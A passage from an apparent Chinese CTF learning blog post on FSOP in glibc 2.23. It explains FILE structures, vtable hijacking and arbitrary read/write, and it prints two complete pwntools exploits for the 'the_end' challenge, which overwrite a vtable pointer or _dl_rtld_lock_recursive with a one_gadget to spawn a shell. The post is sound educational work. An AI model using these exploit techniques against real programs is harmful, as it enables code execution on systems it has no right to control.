class="keyword">int</span>)tmp+offsetof(_IO_FILE,_lock)));</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"vatable*:%p\n\n"</span>,*(<span class="keyword">unsigned</span> <span class="keyword">int</span> **)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)tmp+<span class="keyword">sizeof</span>(_IO_FILE)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's see what FILE* have(x64):\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The fopen will malloc a chunk to store the FILE structure and return a ptr to the structure chunk"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's do fopen\n"</span>);</span><br><span class="line">	FILE *f=fopen(<span class="string">"test.txt"</span>,<span class="string">"r+"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And we can see what exactly the structure have at the beginning:\n"</span>);</span><br><span class="line">	printFILE(f);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then we read something from the file(0x20)\n"</span>);</span><br><span class="line">	<span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">0x30</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	fread(<span class="built_in">buffer</span>,<span class="number">1</span>,<span class="number">0x20</span>,f);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"buffer&lt;%s&gt;&lt;%#x&gt;\n"</span>,<span class="built_in">buffer</span>,<span class="built_in">strlen</span>(<span class="built_in">buffer</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the FILE looks like:\n"</span>);</span><br><span class="line">	printFILE(f);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memset</span>(<span class="built_in">buffer</span>,<span class="number">0</span>,<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(<span class="built_in">buffer</span>,<span class="string">"bbbbbbbbbbbbbbbb"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then we write something to the file('b'*0x10)\n"</span>);</span><br><span class="line">	fwrite(<span class="built_in">buffer</span>,<span class="number">1</span>,<span class="built_in">strlen</span>(<span class="built_in">buffer</span>),f);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the FILE looks like:\n"</span>);</span><br><span class="line">	printFILE(f);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Try fflush\n"</span>);</span><br><span class="line">	fflush(f);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the FILE looks like:\n"</span>);</span><br><span class="line">	printFILE(f);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memset</span>(<span class="built_in">buffer</span>,<span class="number">0</span>,<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Read again(0x20)\n"</span>);</span><br><span class="line">	fread(<span class="built_in">buffer</span>,<span class="number">1</span>,<span class="number">0x20</span>,f);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"buffer&lt;%s&gt;&lt;%#x&gt;\n"</span>,<span class="built_in">buffer</span>,<span class="built_in">strlen</span>(<span class="built_in">buffer</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the FILE looks like:\n"</span>);</span><br><span class="line">	printFILE(f);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memset</span>(<span class="built_in">buffer</span>,<span class="string">'*'</span>,<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Write again('*'*0x20)\n"</span>);</span><br><span class="line">	fwrite(<span class="built_in">buffer</span>,<span class="number">1</span>,<span class="number">0x20</span>,f);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the FILE looks like:\n"</span>);</span><br><span class="line">	printFILE(f);</span><br><span class="line">	</span><br><span class="line">	fflush(f);</span><br><span class="line">	</span><br><span class="line">	fclose(f);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the FILE looks like(Use after free):\n"</span>);</span><br><span class="line">	printFILE(f);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中最主要的大概是fopen时malloc了一个0x230的chunk来存放结构体，然后第一次调用fread时分配了一个0x1000的文件缓冲区，第一次会把文件的全部内容都读到这个缓冲区里面（正确与否有待深究，自己看来暂时是这样）</p>
+<p><img src="/2020/02/25/FSOP-the-end/1582612886398.png" alt="1582612886398"></p>
+<p>_chain域的链接此时结构大概是：<code>_IO_list_all</code>-&gt;<code>f</code>-&gt;<code>_IO_2_1_stderr_</code>-&gt;<code>_IO_2_1_stdout_</code>-&gt;<code>_IO_2_1_stdin_</code>-&gt;NULL</p>
+<p>其中<code>_IO_list_all</code>是一个变量，存储着指向f结构体的指针（以上图为例就是<code>0x603010</code>），f在fopen操作时初始化的FILE*就被链入了这个链表</p>
+<p>再就是<code>fclose</code>会直接把对应的两个chunk一起释放了，释放顺序是先释放文件缓冲区再释放结构体chunk</p>
+<h1 id="Hijack"><a href="#Hijack" class="headerlink" title="Hijack"></a>Hijack</h1><p>至于vtable在<code>_IO_FILE_plus</code>中的偏移量，摘自wiki就是：在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8（wiki）</p>
+<p>如果我们伪造一个vtable，然后修改对应FILE结构体的vtable指针指向我们伪造的vtable，就可以达到劫持程序的目的（不得不说vtable大法好啊23333）</p>
+<p>目前 libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的。不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用（wiki）</p>
+<p>vatble对应的段属性如下所示，在不可写段：</p>
+<p><img src="/2020/02/25/FSOP-the-end/1582618757197.png" alt="1582618757197"></p>
+<p>(wiki上面关于修改vtable的描述已经很详细了，这里不再赘述，主要是以记笔记为主)</p>
+<p>因为 vtable 中的函数调用时会把对应的<code>_IO_FILE_plus</code>指针作为第一个参数传递，因此这里我们把 “sh” 写入<code>_IO_FILE_plus</code> 头部。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system(“sh”)<br>（或者直接试着填<code>one_gadget</code>）</p>
+<h1 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h1><p>（来自raycp师傅的博客）</p>
+<p>控制<code>stdout</code>结构体满足以下条件实现任意泄露：</p>
+<ul>
+<li><code>_IO_write_base</code>指向想要泄露的地方。</li>
+<li><code>_IO_write_ptr</code>指向泄露结束的地址。</li>
+<li><code>_IO_read_end</code>等于<code>_IO_write_base</code>以绕过多余的代码。 满足这三个条件，可实现任意读。当然不包含结构体里的<code>_flags</code>字段的伪造，该字段都从原来的结构体里面复制过来，所以就没去分析该如何构造了。</li>
+</ul>
+<h1 id="Arbitrary-write"><a href="#Arbitrary-write" class="headerlink" title="Arbitrary write"></a>Arbitrary write</h1><p>（来自raycp师傅的博客）</p>
+<p>当<code>_IO_write_end</code> 大于<code>_IO_write_ptr</code>时，<code>memcpy</code>就会调用</p>
+<p>只需要将<code>_IO_write_ptr</code>指向需要写的地址，<code>_IO_write_end</code>指向结束位置即可</p>
+<p>有了任意读与任意写之后，具体实现就是使用任意读泄露libc地址，然后用任意写将<code>one gadget</code>写到<code>malloc_hook</code>中，然后利用<code>%n</code>报错或者是较大的字符打印来触发malloc函数</p>
+<h1 id="the-end"><a href="#the-end" class="headerlink" title="the_end"></a>the_end</h1><p>只看概念当然不代表会用了，肯定要写个题印象才深23333</p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><img src="/2020/02/25/FSOP-the-end/1582615573201.png" alt="1582615573201"></p>
+<p>程序逻辑非常简单，就是给了一个libc地址，然后任意地址写5次，一次一字节，但是程序开启了PIE和Full RELRO，无法改写程序段的内容，这里我由于是第一次写FILE类型的题，所以就参考了师傅们的WP学了很多（看完的感触就是挖洞果然撸源码是王道啊….）</p>
+<p> 当然还有从各路师傅那听来的<a href="http://blog.eonew.cn/archives/1173" target="_blank" rel="noopener">Ex师傅的博客</a>，真的学到了不少东西</p>
+<h2 id="Exploit1"><a href="#Exploit1" class="headerlink" title="Exploit1"></a>Exploit1</h2><p>第一种办法是修改stdin/stdout/stderr任一FILE的vtable指针指向我们可控的区域，由于ubuntu libc2.23存放vtable的段不可写，所以不能直接改vtable。改指针的时候也特别巧妙，改的是指针第二个字节，所以可以在可写的段再去找合适的偏移，当然这里的解法都是参考raycp师傅学的新姿势，所以更清晰明了的解释就推荐去看原博主的文了</p>
+<p>这个方法里面一共改了三处，5次：<br>第一处：stdin/stdout/stderr任一FILE的 <code>_IO_write_ptr</code>，使其大于<code>_IO_write_base</code><br>第二处：对应vtable指针第二字节，改写的地址对应偏移需要有libc地址<br>第三处：对应偏移处有libc地址，修改低三字节</p>
+<p>可能自己接触比较新的就是在libc找合适的地方去改地址<br>我用的命令是 search -p 0x7fxxxx -w，在GDB里面可以直接找到可写的而且有这个地址的内存，然后通过我们需要的偏移比对哪个地址是我们需要的，因为vtable里面是存在偏移的，如果实在是找不到可能就失败了，当然找到的概率还是很大的，毕竟师傅们的利用都这么多了XD</p>
+<p>ps：原来这个就是FSOP，开始还以为FSOP是更深一点的知识，然后点开wiki的FSOP之后发现就是这个23333，一举两得？</p>
+<h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./the_end'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">global_max_fast=<span class="number">0x3c67f8</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loginfo</span><span class="params">(what=<span class="string">''</span>,address=<span class="number">0</span>)</span>:</span></span><br><span class="line">	log.info(<span class="string">"\033[1;36m"</span> + what + <span class="string">'-----&gt;'</span> + hex(address) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''libc 2.23 x64</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL</span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeByte</span><span class="params">(address,Byte)</span>:</span></span><br><span class="line">	p.send(p64(address))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.send(Byte)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'here is a gift '</span>)</span><br><span class="line">libc_base=int(p.recv(len(<span class="string">'0x7f4ec6b9d230'</span>)),<span class="number">16</span>)-libc.symbols[<span class="string">'sleep'</span>]</span><br><span class="line">loginfo(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line"><span class="string">'''stdout</span></span><br><span class="line"><span class="string">stdout_IO_write_ptr=0x3c5648</span></span><br><span class="line"><span class="string">stdout_vtable_off=0x3c56f8</span></span><br><span class="line"><span class="string">address_off=0x3c53e0</span></span><br><span class="line"><span class="string">func_off=0x3c53f8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">stdin_IO_write_ptr=<span class="number">0x3c4908</span></span><br><span class="line">stdin_vtable_off=<span class="number">0x3c49b8</span></span><br><span class="line">address_off=<span class="number">0x3c53e0</span></span><br><span class="line">func_off=<span class="number">0x3c53f8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'brva 0x950')</span></span><br><span class="line">writeByte(stdin_IO_write_ptr+libc_base,<span class="string">'\xff'</span>)</span><br><span class="line">off=address_off+libc_base</span><br><span class="line">off=(off&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line">off=chr(off)</span><br><span class="line">writeByte(stdin_vtable_off+libc_base+<span class="number">1</span>,off)</span><br><span class="line">one_off=<span class="number">0xf1147</span>+libc_base</span><br><span class="line">one_off1=chr(one_off&amp;<span class="number">0xff</span>)</span><br><span class="line">one_off2=chr((one_off&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>)</span><br><span class="line">one_off3=chr((one_off&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">writeByte(func_off+libc_base,one_off1)</span><br><span class="line">writeByte(func_off+libc_base+<span class="number">1</span>,one_off2)</span><br><span class="line">writeByte(func_off+libc_base+<span class="number">2</span>,one_off3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploit2"><a href="#Exploit2" class="headerlink" title="Exploit2"></a>Exploit2</h2><p>第二种方法真的是让我感受到了函数指针的伟大23333，简直是Control the ptr ，control the world，这些利用都太奇妙了，再就是源码大法好，以后一定要多看看源码</p>
+<p>这里是直接修改的<code>_rtld_global._dl_rtld_lock_recursive</code>这个函数指针….甚至是直接修改地址第三位就可以了…真的tql，被师傅们强大到，以后菜鸡一定多看看源码</p>
+<p>直接放exp吧都没什么好写的了23333</p>
+<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./the_end'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">global_max_fast=<span class="number">0x3c67f8</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loginfo</span><span class="params">(what=<span class="string">''</span>,address=<span class="number">0</span>)</span>:</span></span><br><span class="line">	log.info(<span class="string">"\033[1;36m"</span> + what + <span class="string">'-----&gt;'</span> + hex(address) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''libc 2.23 x64</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL</span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeByte</span><span class="params">(address,Byte)</span>:</span></span><br><span class="line">	p.send(p64(address))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.send(Byte)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'here is a gift '</span>)</span><br><span class="line">libc_base=int(p.recv(len(<span class="string">'0x7f4ec6b9d230'</span>)),<span class="number">16</span>)-libc.symbols[<span class="string">'sleep'</span>]</span><br><span class="line">loginfo(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line"></span><br><span class="line">ptr_off_set=<span class="number">0x5f0f48</span></span><br><span class="line">one_gadget=<span class="number">0xf02a4</span>+libc_base</span><br><span class="line">off1=one_gadget&amp;<span class="number">0xff</span></span><br><span class="line">off2=(one_gadget&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">off3=(one_gadget&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'brva 0x950')</span></span><br><span class="line">writeByte(libc_base+ptr_off_set,chr(off1))</span><br><span class="line">writeByte(libc_base+ptr_off_set,chr(off1))</span><br><span class="line">writeByte(libc_base+ptr_off_set,chr(off1))</span><br><span class="line">writeByte(libc_base+ptr_off_set+<span class="number">1</span>,chr(off2))</span><br><span class="line">writeByte(libc_base+ptr_off_set+<span class="number">2</span>,chr(off3))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/02/22/how2heap-house-of-force-cookbook%E3%80%81bcloud/" rel="prev" title="how2heap - house_of_force&cookbook、bcloud">
+      <i class="fa fa-chevron-left"></i> how2heap - house_of_force&cookbook、bcloud
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/02/26/how2heap-unsorted-bin-zerostorage/" rel="next" title="how2heap - unsorted_bin&zerostorage">
+      how2heap - unsorted_bin&zerostorage <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#FSOP学习"><span class="nav-number">1.</span> <span class="nav-text">FSOP学习</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FILE"><span class="nav-number">2.</span> <span class="nav-text">FILE *</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#IO-FILE-plus-amp-IO-jump-t"><span class="nav-number">3.</span> <span class="nav-text">_IO_FILE_plus&amp;_IO_jump_t</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#调用链"><span class="nav-number">4.</span> <span class="nav-text">调用链</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#自己的调试代码"><span class="nav-number">5.</span> <span class="nav-text">自己的调试代码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hijack"><span class="nav-number">6.</span> <span class="nav-text">Hijack</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#leak"><span class="nav-number">7.</span> <span class="nav-text">leak</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Arbitrary-write"><span class="nav-number">8.</span> <span class="nav-text">Arbitrary write</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#the-end"><span class="nav-number">9.</span> <span class="nav-text">the_end</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#程序分析"><span class="nav-number">9.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit1"><span class="nav-number">9.2.</span> <span class="nav-text">Exploit1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#完整EXP"><span class="nav-number">9.2.1.</span> <span class="nav-text">完整EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit2"><span class="nav-number">9.3.</span> <span class="nav-text">Exploit2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#完整exp"><span class="nav-number">9.3.1.</span> <span class="nav-text">完整exp</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
